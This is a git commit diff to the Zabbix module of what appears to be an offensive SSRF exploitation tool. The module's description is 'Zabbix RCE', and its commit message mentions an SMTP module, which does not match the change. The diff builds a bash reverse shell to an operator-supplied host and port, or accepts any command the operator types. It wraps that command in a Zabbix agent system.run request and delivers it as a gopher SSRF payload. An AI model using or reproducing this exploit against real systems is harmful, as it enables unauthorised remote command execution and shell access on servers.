65c73647f8c9c385c64fc1f67c9ae8ba04829ad8
Swissky <swisskysec@protonmail.com>
2018-10-16 21:53:25 +0200

    MODULE - SMTP service : send mail

--- modules/zabbix.py
+++ modules/zabbix.py
@@ -6,27 +6,37 @@ name        = "zabbix"
 description = "Zabbix RCE"
 author      = "Swissky"
 
+# Note
+# Require `EnableRemoteCommands = 1` on the Zabbix service
+
 class exploit():
+    cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"
 
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
 
+        cmd = input("Give command to execute (Enter for Reverse Shell): ")
+        if cmd == "":
+            if args.lhost == None: 
+                self.cmd = self.cmd.replace("SERVER_HOST", input("Server Host:"))
+            else:
+                self.cmd = self.cmd.replace("SERVER_HOST", args.lhost)
+
+            if args.lport == None: 
+                self.cmd = self.cmd.replace("SERVER_PORT", input("Server Port:"))
+            else:
+                self.cmd = self.cmd.replace("SERVER_PORT", args.lport)
+        else:
+            self.cmd  = cmd
+
         # Data for the service
         ip   = "127.0.0.1"
         port = "10050"
-        cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"
-        cmd = urllib.quote_plus(cmd).replace("+","%20")
-        cmd = cmd.replace("%2F","/")
-        cmd = cmd.replace("%25","%")
-        cmd = cmd.replace("%3A",":")
-        data = "system.run[(" + cmd + ");sleep 2s]"
-
-        # Handle args for reverse shell
-        if args.lhost == None: data = data.replace("SERVER_HOST", input("Server Host:"))
-        else:                  data = data.replace("SERVER_HOST", args.lhost)
-
-        if args.lport == None: data = data.replace("SERVER_PORT", input("Server Port:"))
-        else:                  data = data.replace("SERVER_PORT", args.lport)
+        self.cmd = urllib.quote_plus(self.cmd).replace("+","%20")
+        self.cmd = self.cmd.replace("%2F","/")
+        self.cmd = self.cmd.replace("%25","%")
+        self.cmd = self.cmd.replace("%3A",":")
+        data = "system.run[(" + self.cmd + ");sleep 2s]"
         
         payload = wrapper_gopher(data, ip , port)
         logging.info("Generated payload : {}".format(payload))
